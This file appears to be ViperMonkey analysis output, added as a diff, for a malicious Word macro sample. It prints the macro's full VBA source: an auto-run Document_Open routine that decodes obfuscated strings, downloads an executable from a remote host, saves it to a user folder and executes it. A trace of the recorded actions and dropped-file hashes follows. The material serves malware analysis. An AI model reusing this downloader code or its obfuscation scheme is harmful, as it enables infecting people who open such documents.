@@ -1,0 +1,250 @@
+ _    ___                 __  ___            __             
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+     /_/                                           /____/   
+vmonkey 1.0.3 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: ./Sample_C.docm
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+
+Function awuiut() As Byte
+awuiut = 0
+Call wiztuo
+End Function
+
+Private Sub Document_Open2()
+Dim QYgjfSpecialPathOIhb As String
+Dim WshShell As Object
+' STRIPPED LINE
+' STRIPPED LINE
+
+
+
+Set WshShell = CreateObject("WScript.Shell")
+QYgjfSpecialPathOIhb = WshShell.SpecialFolders("Printhood")
+Dim item1
+Dim item2
+Dim item3
+Dim item4
+Dim item5
+Dim item6 As Integer
+Dim item7
+' STRIPPED LINE
+item6 = 1
+
+
+
+Set item7 = CreateObject("microsoft.xmlhttp")
+Set item5 = CreateObject("Shell.Application")
+
+item4 = QYgjfSpecialPathOIhb  + item9("\¥ØZJW.ÂÛÂ")
+item7.Open "get", item9("hÖÖÓ://bÀgÕÔÀd.ÁÒm:8099/vÒÔÔÜ/ÕÂÔvÂÔ1.ÂÛÂ"), False
+item7.send
+item2 = item7.responseBody
+If item7.Status = 200 Then
+
+Set item1 = CreateObject("adodb.stream")
+item1.Open
+item1.Type = item6
+item1.Write item2
+item1.SaveToFile item4, item6  + item6
+item1.Close
+End If
+item5.Open (item4)
+End Sub
+Function wiztuo() As Currency
+wiztuo = 1000000000
+Call Bitiob
+End Function
+Function Bitiob() As Double
+Call RUitiobb
+End Function
+Function RUitiobb() As Integer
+RUitiobb = 41
+Call Hiotbdek
+End Function
+Function Hiotbdek() As Long
+Hiotbdek = Hiotbdek
+Call Jiotbdek
+End Function
+
+
+Public Function item10(item11)
+item12 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄ�ÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+item13 = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklm�ÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
+For R = 1 To Len(item11)
+item14 = InStr(item12, Mid(item11, R, 1))
+If item14 > 0 Then
+
+item15 = Mid(item13, item14, 1)
+item16 = item16  + item15
+Else
+item16 = item16  + Mid(item11, R, 1)
+End If
+Next
+item10 = item16
+MsgBox item10
+End Function
+
+
+Function Jiotbdek() As Single
+Jiotbdek = Jiotbdek
+Call finiotbdek
+End Function
+Function finiotbdek() As Date
+
+End Function
+
+Public Function item9(item17)
+item18 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄ�ÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
+item19 = " ¿¡@#$%^&*()_+|01²³456789ÀbÁdÂÃghÄjklm�ÒÓqÔÕÖÙvwÛÜz.,-~AàáâãFGHäJKåMNØ¶QR§TÚVWX¥Z?!23acefinoprstuxyBCDEILOPSUY"
+For D = 1 To Len(item17)
+item20 = InStr(item18, Mid(item17, D, 1))
+If item20 > 0 Then
+
+item21 = Mid(item19, item20, 1)
+item22 = item22  + item21
+Else
+item22 = item22  + Mid(item17, D, 1)
+End If
+Next
+item9 = item22
+End Function
+
+
+
+Function Dionbt() As Currency
+Call tiuoty
+End Function
+Function tiuoty() As Boolean
+tiuoty = False
+Call awuiut
+End Function
+
+Private Sub Document_Open()
+Dim UtfvSpecialPathKHVjh As String
+Dim WshShell As Object
+' STRIPPED LINE
+' STRIPPED LINE
+
+
+
+Set WshShell = CreateObject("WScript.Shell")
+UtfvSpecialPathKHVjh = WshShell.SpecialFolders("Recent")
+Dim item24
+Dim item25
+' STRIPPED LINE
+Dim item27
+Dim item28
+Dim item29 As Integer
+Dim item30
+' STRIPPED LINE
+item29 = 1
+
+
+MsgBox "Advertencia: Macro cargada....(Recargar documento)"
+
+Set item30 = CreateObject("microsoft.xmlhttp")
+Set item28 = CreateObject("Shell.Application")
+
+item27 = UtfvSpecialPathKHVjh  + item10("\Hä§HJQV.ÂÛÂ")
+item30.Open "get", item10("hÖÖÓ://bÀgÕÔÀd.ÁÒm:8099/ÜÒÔÔÜ/ÕÂÔvÂÔ1.ÂÛÂ"), False
+item30.send
+item25 = item30.responseBody
+If item30.Status = 200 Then
+
+Set item24 = CreateObject("adodb.stream")
+item24.Open
+item24.Type = item29
+item24.Write item25
+item24.SaveToFile item27, item29  + item29
+item24.Close
+End If
+item28.Open (item27)
+End Sub
+
+
+
+
+
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+
+Sub doc()
+End Sub
+
+
+
+
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+
+-------------------------------------------------------------------------------
+TRACING VBA CODE (entrypoint = Auto*):
+
+Recorded Actions:
++--------------------+---------------------------+---------------------------+
+| Action             | Parameters                | Description               |
++--------------------+---------------------------+---------------------------+
+| Found Entry Point  | document_open             |                           |
+| CreateObject       | ['WScript.Shell']         | Interesting Function Call |
+| Display Message    | ['Advertencia: Macro      | MsgBox                    |
+|                    | cargada....(Recargar      |                           |
+|                    | documento)']              |                           |
+| CreateObject       | ['microsoft.xmlhttp']     | Interesting Function Call |
+| CreateObject       | ['Shell.Application']     | Interesting Function Call |
+| Display Message    | ['\\HHJQV.rr']            | MsgBox                    |
+| Display Message    | ['hUUE://bigPLid.oCm:8099 | MsgBox                    |
+|                    | /CLL/PrLvrL1.rr']         |                           |
+| item30.Open        | ['get', 'hUUE://bigPLid.o | Interesting Function Call |
+|                    | Cm:8099/CLL/PrLvrL1.rr',  |                           |
+|                    | False]                    |                           |
+| Object.Method Call | ['get', 'hUUE://bigPLid.o | item30.Open               |
+|                    | Cm:8099/CLL/PrLvrL1.rr',  |                           |
+|                    | False]                    |                           |
+| File Access        | get                       |                           |
+| CreateObject       | ['adodb.stream']          | Interesting Function Call |
+| item24.Open        |                           | Interesting Function Call |
+| Object.Method Call | ['%Recent%\\HHJQV.rr', 2] | item24.SaveToFile         |
+| Dropped File Hash  | e3b0c44298fc1c149afbf4c89 | File Name: ADODB.Stream   |
+|                    | 96fb92427ae41e4649b934ca4 |                           |
+|                    | 95991b7852b855            |                           |
+| item28.Open        | ['%Recent%\\HHJQV.rr']    | Interesting Function Call |
+| Object.Method Call | ['%Recent%\\HHJQV.rr']    | item28.Open               |
+| File Access        | %Recent%\HHJQV.rr         |                           |
+| Dropped File Hash  | 21eac00ec11c89e381668f3e3 | File Name: get            |
+|                    | 6bb1b24e98f79a41c44f49b2b |                           |
+|                    | 7689aa5bb222f1            |                           |
+| Dropped File Hash  | 21eac00ec11c89e381668f3e3 | File Name: get            |
+|                    | 6bb1b24e98f79a41c44f49b2b |                           |
+|                    | 7689aa5bb222f1            |                           |
+| Dropped File Hash  | e3b0c44298fc1c149afbf4c89 | File Name: HHJQV.rr       |
+|                    | 96fb92427ae41e4649b934ca4 |                           |
+|                    | 95991b7852b855            |                           |
+| Dropped File Hash  | e3b0c44298fc1c149afbf4c89 | File Name: HHJQV.rr       |
+|                    | 96fb92427ae41e4649b934ca4 |                           |
+|                    | 95991b7852b855            |                           |
++--------------------+---------------------------+---------------------------+
+
+VBA Builtins Called: ['CreateObject', 'InStr', 'Len', 'Mid', 'MsgBox', 'SpecialFolders']
+
+Finished analyzing ./sample_C (4).docm .
+
